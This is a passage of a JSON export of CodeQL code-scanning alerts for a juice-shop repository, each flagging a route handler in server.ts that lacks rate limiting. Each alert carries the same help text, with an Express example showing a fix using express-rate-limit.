res.sendFile(path);\n});\n\n```\nTo prevent denial-of-service attacks, the `express-rate-limit` package can be used:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\n// set up rate limiter: maximum of five requests per minute\nvar RateLimit = require('express-rate-limit');\nvar limiter = RateLimit({\n  windowMs: 15 * 60 * 1000, // 15 minutes\n  max: 100, // max 100 requests per windowMs\n});\n\n// apply rate limiter to all requests\napp.use(limiter);\n\napp.get('/:path', function(req, res) {\n  let path = req.params.path;\n  if (isValidPath(path))\n    res.sendFile(path);\n});\n\n```\n\n## References\n* OWASP: [Denial of Service Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html).\n* Wikipedia: [Denial-of-service attack](https://en.wikipedia.org/wiki/Denial-of-service_attack).\n* NPM: [express-rate-limit](https://www.npmjs.com/package/express-rate-limit).\n* Common Weakness Enumeration: [CWE-770](https://cwe.mitre.org/data/definitions/770.html).\n* Common Weakness Enumeration: [CWE-307](https://cwe.mitre.org/data/definitions/307.html).\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.4"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql.yml:analyze","environment":"{\"build-mode\":\"none\",\"language\":\"javascript-typescript\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"This route handler performs a database access, but is not rate-limited."},"location":{"path":"server.ts","start_line":605,"end_line":605,"start_column":64,"end_column":86},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/39/instances","dismissal_approved_by":null},{"number":38,"created_at":"2025-01-27T04:17:20Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/38","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/38","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/missing-rate-limiting","severity":"warning","description":"Missing rate limiting","name":"js/missing-rate-limiting","tags":["external/cwe/cwe-307","external/cwe/cwe-400","external/cwe/cwe-770","security"],"full_description":"An HTTP request handler that performs expensive operations without restricting the rate at which operations can be carried out is vulnerable to denial-of-service attacks.","help":"# Missing rate limiting\nHTTP request handlers should not perform expensive operations such as accessing the file system, executing an operating system command or interacting with a database without limiting the rate at which requests are accepted. Otherwise, the application becomes vulnerable to denial-of-service attacks where an attacker can cause the application to crash or become unresponsive by issuing a large number of requests at the same time.\n\n\n## Recommendation\nA rate-limiting middleware should be used to prevent such attacks.\n\n\n## Example\nThe following example shows an Express application that serves static files without rate limiting:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\napp.get('/:path', function(req, res) {\n  let path = req.params.path;\n  if (isValidPath(path))\n    res.sendFile(path);\n});\n\n```\nTo prevent denial-of-service attacks, the `express-rate-limit` package can be used:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\n// set up rate limiter: maximum of five requests per minute\nvar RateLimit = require('express-rate-limit');\nvar limiter = RateLimit({\n  windowMs: 15 * 60 * 1000, // 15 minutes\n  max: 100, // max 100 requests per windowMs\n});\n\n// apply rate limiter to all requests\napp.use(limiter);\n\napp.get('/:path', function(req, res) {\n  let path = req.params.path;\n  if (isValidPath(path))\n    res.sendFile(path);\n});\n\n```\n\n## References\n* OWASP: [Denial of Service Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html).\n* Wikipedia: [Denial-of-service attack](https://en.wikipedia.org/wiki/Denial-of-service_attack).\n* NPM: [express-rate-limit](https://www.npmjs.com/package/express-rate-limit).\n* Common Weakness Enumeration: [CWE-770](https://cwe.mitre.org/data/definitions/770.html).\n* Common Weakness Enumeration: [CWE-307](https://cwe.mitre.org/data/definitions/307.html).\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.4"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql.yml:analyze","environment":"{\"build-mode\":\"none\",\"language\":\"javascript-typescript\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"This route handler performs a database access, but is not rate-limited."},"location":{"path":"server.ts","start_line":604,"end_line":604,"start_column":41,"end_column":63},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/38/instances","dismissal_approved_by":null},{"number":37,"created_at":"2025-01-27T04:17:20Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/37","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/37","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/missing-rate-limiting","severity":"warning","description":"Missing rate limiting","name":"js/missing-rate-limiting","tags":["external/cwe/cwe-307","external/cwe/cwe-400","external/cwe/cwe-770","security"],"full_description":"An HTTP request handler that performs expensive operations without restricting the rate at which operations can be carried out is vulnerable to denial-of-service attacks.","help":"# Missing rate limiting\nHTTP request handlers should not perform expensive operations such as accessing the file system, executing an operating system command or interacting with a database without limiting the rate at which requests are accepted. Otherwise, the application becomes vulnerable to denial-of-service attacks where an attacker can cause the application to crash or become unresponsive by issuing a large number of requests at the same time.\n\n\n## Recommendation\nA rate-limiting middleware should be used to prevent such attacks.\n\n\n## Example\nThe following example shows an Express application that serves static files without rate limiting:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\napp.get('/:path', function(req, res) {\n  let path = req.params.path;\n  if (isValidPath(path))\n    res.sendFile(path);\n});\n\n```\nTo prevent denial-of-service attacks, the `express-rate-limit` package can be used:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\n// set up rate limiter: maximum of five requests per minute\nvar RateLimit = require('express-rate-limit');\nvar limiter = RateLimit({\n  windowMs: 15 * 60 * 1000, // 15 minutes\n  max: 100, // max 100 requests per windowMs\n});\n\n// apply rate limiter to all requests\napp.use(limiter);\n\napp.get('/:path', function(req, res) {\n  let path = req.params.path;\n  if (isValidPath(path))\n    res.sendFile(path);\n});\n\n```\n\n## References\n* OWASP: [Denial of Service Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html).\n* Wikipedia: [Denial-of-service attack](https://en.wikipedia.org/wiki/Denial-of-service_attack).\n* NPM: [express-rate-limit](https://www.npmjs.com/package/express-rate-limit).\n* Common Weakness Enumeration: [CWE-770](https://cwe.mitre.org/data/definitions/770.html).\n* Common Weakness Enumeration: [CWE-307](https://cwe.mitre.org/data/definitions/307.html).\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.4"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql.yml:analyze","environment":"{\"build-mode\":\"none\",\"language\":\"javascript-typescript\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"This route handler performs a database access, but is not rate-limited."},"location":{"path":"server.ts","start_line":603,"end_line":603,"start_column":41,"end_column":61},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/37/instances","dismissal_approved_by":null},{"number":36,"created_at":"2025-01-27T04:17:20Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/36","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/36","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/missing-rate-limiting","severity":"warning","description":"Missing rate limiting","name":"js/missing-rate-limiting","tags":["external/cwe/cwe-307","external/cwe/cwe-400","external/cwe/cwe-770","security"],"full_description":"An HTTP request handler that performs expensive operations without restricting the rate at which operations can be carried out is vulnerable to denial-of-service attacks.","help":"# Missing rate limiting\nHTTP request handlers should not perform expensive operations such as accessing the file system, executing an operating system command or interacting with a database without limiting the rate at which requests are accepted. Otherwise, the application becomes vulnerable to denial-of-service attacks where an attacker can cause the application to crash or become unresponsive by issuing a large number of requests at the same time.\n\n\n## Recommendation\nA rate-limiting middleware should be used to prevent such attacks.\n\n\n## Example\nThe following example shows an Express application that serves static files without rate limiting:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\napp.get('/:path', function(req, res) {\n  let path = req.params.path;\n  if (isValidPath(path))\n    res.sendFile(path);\n});\n\n```\nTo prevent denial-of-service attacks, the `express-rate-limit` package can be used:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\n// set up rate limiter: maximum of five requests per minute\nvar RateLimit = require('express-rate-limit');\nvar limiter = RateLimit({\n  windowMs: 15 * 60 * 1000, // 15 minutes\n  max: 100, // max 100 requests per windowMs\n});\n\n// apply rate limiter to all requests\napp.use(limiter);\n\napp.get('/:path', function(req, res) {\n  let path = req.params.path;\n  if (isValidPath(path))\n    res.sendFile(path);\n});\n\n```\n\n## References\n* OWASP: [Denial of Service Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html).\n* Wikipedia: [Denial-of-service attack](https://en.wikipedia.org/wiki/Denial-of-service_attack).\n* NPM: [express-rate-limit](https://www.npmjs.com/package/express-rate-limit).\n* Common Weakness Enumeration: [CWE-770](https://cwe.mitre.org/data/definitions/770.html).\n* Common Weakness Enumeration: [CWE-307](https://cwe.mitre.org/data/definitions/307.html).\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.4"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql.yml:analyze","environment":"{\"build-mode\":\"none\",\"language\":\"javascript-typescript\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"This route handler performs a database access, but is not rate-limited."},"location":{"path":"server.ts","start_line":594,"end_line":594,"start_column":79,"end_column":114},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/36/instances","dismissal_approved_by":null},{"number":35,"created_at":"2025-01-27T04:17:20Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/35","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/35","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/missing-rate-limiting","severity":"warning","description":"Missing rate limiting","name":"js/missing-rate-limiting","tags":["external/cwe/cwe-307","external/cwe/cwe-400","external/cwe/cwe-770","security"],"full_description":"An HTTP request handler that performs expensive operations without restricting the rate at which operations can be carried out is vulnerable to denial-of-service attacks.","help":"# Missing rate limiting\nHTTP request handlers should not perform expensive operations such as accessing the file system, executing an operating system command or interacting with a database without limiting the rate at which requests are accepted. Otherwise, the application becomes vulnerable to denial-of-service attacks where an attacker can cause the application to crash or become unresponsive by issuing a large number of requests at the same time.\n\n\n## Recommendation\nA rate-limiting middleware should be used to prevent such attacks.\n\n\n## Example\nThe following example shows an Express application that serves static files without rate limiting:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\napp.get('/:path', function(req, res) {\n  let path = req.params.path;\n  if (isValidPath(path))\n    res.sendFile(path);\n});\n\n```\nTo prevent denial-of-service attacks, the `express-rate-limit` package can be used:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\n// set up rate limiter: maximum of five requests per minute\nvar RateLimit = require('express-rate-limit');\nvar limiter = RateLimit({\n  windowMs: 15 * 60 * 1000, // 15 minutes\n  max: 100, // max 100 requests per windowMs\n});\n\n// apply rate limiter to all requests\napp.use(limiter);\n\napp.get('/:path', function(req, res) {\n  let path = req.params.path;\n  if (isValidPath(path))\n    res.sendFile(path);\n});\n\n```\n\n## References\n* OWASP: [Denial of Service Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html).\n* Wikipedia: [Denial-of-service attack](https://en.wikipedia.org/wiki/Denial-of-service_attack).\n* NPM: [express-rate-limit](https://www.npmjs.com/package/express-rate-limit).\n* Common Weakness Enumeration: [CWE-770](https://cwe.mitre.org/data/definitions/770.html).\n* Common Weakness Enumeration: [CWE-307](https://cwe.mitre.org/data/definitions/307.html).\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.4"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql.yml:analyze","environment":"{\"build-mode\":\"none\",\"language\":\"javascript-typescript\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"This route handler performs authorization, but is not rate-limited."},"location":{"path":"server.ts","start_line":594,"end_line":594,"start_column":54,"end_column":77},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/35/instances","dismissal_approved_by":null},{"number":34,"created_at":"2025-01-27T04:17:20Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/34","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/34","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/missing-rate-limiting","severity":"warning","description":"Missing rate limiting","name":"js/missing-rate-limiting","tags":["external/cwe/cwe-307","external/cwe/cwe-400","external/cwe/cwe-770","security"],"full_description":"An HTTP request handler that performs expensive operations without restricting the rate at which operations can be carried out is vulnerable to denial-of-service attacks.","help":"# Missing rate limiting\nHTTP request handlers should not perform expensive operations such as accessing the file system, executing an operating system command or interacting with a database without limiting the rate at which requests are accepted. Otherwise, the application becomes vulnerable to denial-of-service attacks where an attacker can cause the application to crash or become unresponsive by issuing a large number of requests at the same time.\n\n\n## Recommendation\nA rate-limiting middleware should be used to prevent such attacks.\n\n\n## Example\nThe following example shows an Express application that serves static files without rate limiting:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\napp.get('/:path', function(req, res) {\n  let path = req.params.path;\n  if (isValidPath(path))\n    res.sendFile(path);\n});\n\n```\nTo prevent denial-of-service attacks, the `express-rate-limit` package can be used:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\n// set up rate limiter: maximum of five requests per minute\nvar RateLimit = require('express-rate-limit');\nvar limiter = RateLimit({\n  windowMs: 15 * 60 * 1000, // 15 minutes\n  max: 100, // max 100 requests per windowMs\n});\n\n// apply rate limiter to all requests\napp.use(limiter);\n\napp.get('/:path', function(req, res) {\n  let path = req.params.path;\n  if (isValidPath(path))\n    res.sendFile(path);\n});\n\n```\n\n## References\n* OWASP: [Denial of Service Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html).\n* Wikipedia: [Denial-of-service attack](https://en.wikipedia.org/wiki/Denial-of-service_attack).\n* NPM: [express-rate-limit](https://www.npmjs.com/package/express-rate-limit).\n* Common Weakness Enumeration: [CWE-770](https://cwe.mitre.org/data/definitions/770.html).\n* Common Weakness Enumeration: [CWE-307](https://cwe.mitre.org/data/definitions/307.html).\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.4"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql.yml:analyze","environment":"{\"build-mode\":\"none\",\"language\":\"javascript-typescript\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"This route handler performs a database access, but is not rate-limited."},"location":{"path":"server.ts","start_line":593,"end_line":593,"start_column":66,"end_column":90},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/34/instances","dismissal_approved_by":null},{"number":33,"created_at":"2025-01-27T04:17:20Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/33","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/33","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/missing-rate-limiting","severity":"warning","description":"Missing rate limiting","name":"js/missing-rate-limiting","tags":["external/cwe/cwe-307","external/cwe/cwe-400","external/cwe/cwe-770","security"],"full_description":"An HTTP request handler that performs expensive operations without restricting the rate at which operations can be carried out is vulnerable to denial-of-service attacks.","help":"# Missing rate limiting\nHTTP request handlers should not perform expensive operations such as accessing the file system, executing an operating system command or interacting with a database without limiting the rate at which requests are accepted. Otherwise, the application becomes vulnerable to denial-of-service attacks where an attacker can cause the application to crash or become unresponsive by issuing a large number of requests at the same time.\n\n\n## Recommendation\nA rate-limiting middleware should be used to prevent such attacks.\n\n\n## Example\nThe following example shows an Express application that serves static files without rate limiting:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\napp.get('/:path', function(req, res) {\n  let path = req.params.path;\n  if (isValidPath(path))\n    res.sendFile(path);\n});\n\n```\nTo prevent denial-of-service attacks, the `express-rate-limit` package can be used:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\n// set up rate limiter: maximum of five requests per minute\nvar RateLimit = require('express-rate-limit');\nvar limiter = RateLimit({\n  windowMs: 15 * 60 * 1000, // 15 minutes\n  max: 100, // max 100 requests per windowMs\n});\n\n// apply rate limiter to all requests\napp.use(limiter);\n\napp.get('/:path', function(req, res) {\n  let path = req.params.path;\n  if (isValidPath(path))\n    res.sendFile(path);\n});\n\n```\n\n## References\n* OWASP: [Denial of Service Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html).\n* Wikipedia: [Denial-of-service attack](https://en.wikipedia.org/wiki/Denial-of-service_attack).\n* NPM: [express-rate-limit](https://www.npmjs.com/package/express-rate-limit).\n* Common Weakness Enumeration: [CWE-770](https://cwe.mitre.org/data/definitions/770.html).\n* Common Weakness Enumeration: [CWE-307](https://cwe.mitre.org/data/definitions/307.html).\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.4"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql.yml:analyze","environment":"{\"build-mode\":\"none\",\"language\":\"javascript-typescript\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"This route handler performs authorization, but is not rate-limited."},"location":{"path":"server.ts","start_line":593,"end_line":593,"start_column":41,"end_column":64},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/33/instances","dismissal_approved_by":null},{"number":32,"created_at":"2025-01-27T04:17:20Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/32","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/32","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/missing-rate-limiting","severity":"warning","description":"Missing rate limiting","name":"js/missing-rate-limiting","tags":["external/cwe/cwe-307","external/cwe/cwe-400","external/cwe/cwe-770","security"],"full_description":"An HTTP request handler that performs expensive operations without restricting the rate at which operations can be carried out is vulnerable to denial-of-service attacks.","help":"# Missing rate limiting\nHTTP request handlers should not perform expensive operations such as accessing the file system, executing an operating system command or interacting with a database without limiting the rate at which requests are accepted. Otherwise, the application becomes vulnerable to denial-of-service attacks where an attacker can cause the application to crash or become unresponsive by issuing a large number of requests at the same time.\n\n\n## Recommendation\nA rate-limiting middleware should be used to prevent such attacks.\n\n\n## Example\nThe following example shows an Express application that serves static files without rate limiting:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\napp.get('/:path', function(req, res) {\n  let path = req.params.path;\n  if (isValidPath(path))\n    res.sendFile(path);\n});\n\n```\nTo prevent denial-of-service attacks, the `express-rate-limit` package can be used:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\n// set up rate limiter: maximum of five requests per minute\nvar RateLimit = require('express-rate-limit');\nvar limiter = RateLimit({\n  windowMs: 15 * 60 * 1000, // 15 minutes\n  max: 100, // max 100 requests per windowMs\n});\n\n// apply rate limiter to all requests\napp.use(limiter);\n\napp.get('/:path', function(req, res) {\n  let path = req.params.path;\n  if (isValidPath(path))\n    res.sendFile(path);\n});\n\n```\n\n## References\n* OWASP: [Denial of Service Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html).\n* Wikipedia: [Denial-of-service attack](https://en.wikipedia.org/wiki/Denial-of-service_attack).\n* NPM: [express-rate-limit](https://www.npmjs.com/package/express-rate-limit).\n* Common Weakness Enumeration: [CWE-770](https://cwe.mitre.org/data/definitions/770.html).\n* Common Weakness Enumeration: [CWE-307](https://cwe.mitre.org/data/definitions/307.html).\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.4"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql.yml:analyze","environment":"{\"build-mode\":\"none\",\"language\":\"javascript-typescript\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"This route handler performs a database access, but is not rate-limited."},"location":{"path":"server.ts","start_line":592,"end_line":592,"start_column":34,"end_column":61},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/32/instances","dismissal_approved_by":null},{"number":31,"created_at":"2025-01-27T04:17:20Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/31","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/31","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/missing-rate-limiting","severity":"warning","description":"Missing rate limiting","name":"js/missing-rate-limiting","tags":["external/cwe/cwe-307","external/cwe/cwe-400","external/cwe/cwe-770","security"],"full_description":"An HTTP request handler that performs expensive operations without restricting the rate at which operations can be carried out is vulnerable to denial-of-service attacks.","help":"# Missing rate limiting\nHTTP request handlers should not perform expensive operations such as accessing the file system, executing an operating system command or interacting with a database without limiting the rate at which requests are accepted. Otherwise, the application becomes vulnerable to denial-of-service attacks where an attacker can cause the application to crash or become unresponsive by issuing a large number of requests at the same time.\n\n\n## Recommendation\nA rate-limiting middleware should be used to prevent such attacks.\n\n\n## Example\nThe following example shows an Express application that serves static files without rate limiting:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\napp.get('/:path', function(req, res) {\n  let path = req.params.path;\n  if (isValidPath(path))\n    res.sendFile(path);\n});\n\n```\nTo prevent denial-of-service attacks, the `express-rate-limit` package can be used:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\n// set up rate limiter: maximum of five requests per minute\nvar RateLimit = require('express-rate-limit');\nvar limiter = RateLimit({\n  windowMs: 15 * 60 * 1000, // 15 minutes\n  max: 100, // max 100 requests per windowMs\n});\n\n// apply rate limiter to all requests\napp.use(limiter);\n\napp.get('/:path', function(req, res) {\n  let path = req.params.path;\n  if (isValidPath(path))\n    res.sendFile(path);\n});\n\n```\n\n## References\n* OWASP: [Denial of Service Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html).\n* Wikipedia: [Denial-of-service attack](https://en.wikipedia.org/wiki/Denial-of-service_attack).\n* NPM: [express-rate-limit](https://www.npmjs.com/package/express-rate-limit).\n* Common Weakness Enumeration: [CWE-770](https://cwe.mitre.org/data/definitions/770.html).\n* Common Weakness Enumeration: [CWE-307](https://cwe.mitre.org/data/definitions/307.html).\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.4"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql.yml:analyze","environment":"{\"build-mode\":\"none\",\"language\":\"javascript-typescript\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"This route handler performs a file system access, but is not rate-limited."},"location":{"path":"server.ts","start_line":591,"end_line":591,"start_column":30,"end_column":44},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/31/instances","dismissal_approved_by":null},{"number":30,"created_at":"2025-01-27T04:17:20Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/30","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/30","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/missing-rate-limiting","severity":"warning","description":"Missing rate limiting","name":"js/missing-rate-limiting","tags":["external/cwe/cwe-307","external/cwe/cwe-400","external/cwe/cwe-770","security"],"full_description":"An HTTP request handler that performs expensive operations without restricting the rate at which operations can be carried out is vulnerable to denial-of-service attacks.","help":"# Missing rate limiting\nHTTP request handlers should not perform expensive operations such as accessing the file system, executing an operating system command or interacting with a database without limiting the rate at which requests are accepted. Otherwise, the application becomes vulnerable to denial-of-service attacks where an attacker can cause the application to crash or become unresponsive by issuing a large number of requests at the same time.\n\n\n## Recommendation\nA rate-limiting middleware should be used to prevent such attacks.\n\n\n## Example\nThe following example shows an Express application that serves static files without rate limiting:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\napp.get('/:path', function(req, res) {\n  let path = req.params.path;\n  if (isValidPath(path))\n    res.sendFile(path);\n});\n\n```\nTo prevent denial-of-service attacks, the `express-rate-limit` package can be used:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\n// set up rate limiter: maximum of five requests per minute\nvar RateLimit = require('express-rate-limit');\nvar limiter = RateLimit({\n  windowMs: 15 * 60 * 1000, // 15 minutes\n  max: 100, // max 100 requests per windowMs\n});\n\n// apply rate limiter to all requests\napp.use(limiter);\n\napp.get('/:path', function(req, res) {\n  let path = req.params.path;\n  if (isValidPath(path))\n    res.sendFile(path);\n});\n\n```\n\n## References\n* OWASP: [Denial of Service Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html).\n* Wikipedia: [Denial-of-service attack](https://en.wikipedia.org/wiki/Denial-of-service_attack).\n* NPM: [express-rate-limit](https://www.npmjs.com/package/express-rate-limit).\n* Common Weakness Enumeration: [CWE-770](https://cwe.mitre.org/data/definitions/770.html).\n* Common Weakness Enumeration: [CWE-307](https://cwe.mitre.org/data/definitions/307.html).\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.4"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql.yml:analyze","environment":"{\"build-mode\":\"none\",\"language\":\"javascript-typescript\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"This route handler performs a database access, but is not rate-limited."},"location":{"path":"server.ts","start_line":590,"end_line":590,"start_column":63,"end_column":75},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/30/instances","dismissal_approved_by":null},{"number":29,"created_at":"2025-01-27T04:17:20Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/29","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/29","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/missing-rate-limiting","severity":"warning","description":"Missing rate limiting","name":"js/missing-rate-limiting","tags":["external/cwe/cwe-307","external/cwe/cwe-400","external/cwe/cwe-770","security"],"full_description":"An HTTP request handler that performs expensive operations without restricting the rate at which operations can be carried out is vulnerable to denial-of-service attacks.","help":"# Missing rate limiting\nHTTP request handlers should not perform expensive operations such as accessing the file system, executing an operating system command or interacting with a database without limiting the rate at which requests are accepted. Otherwise, the application becomes vulnerable to denial-of-service attacks where an attacker can cause the application to crash or become unresponsive by issuing a large number of requests at the same time.\n\n\n## Recommendation\nA rate-limiting middleware should be used to prevent such attacks.\n\n\n## Example\nThe following example shows an Express application that serves static files without rate limiting:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\napp.get('/:path', function(req, res) {\n  let path = req.params.path;\n  if (isValidPath(path))\n    res.sendFile(path);\n});\n\n```\nTo prevent denial-of-service attacks, the `express-rate-limit` package can be used:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\n// set up rate limiter: maximum of five requests per minute\nvar RateLimit = require('express-rate-limit');\nvar limiter = RateLimit({\n  windowMs: 15 * 60 * 1000, // 15 minutes\n  max: 100, // max 100 requests per 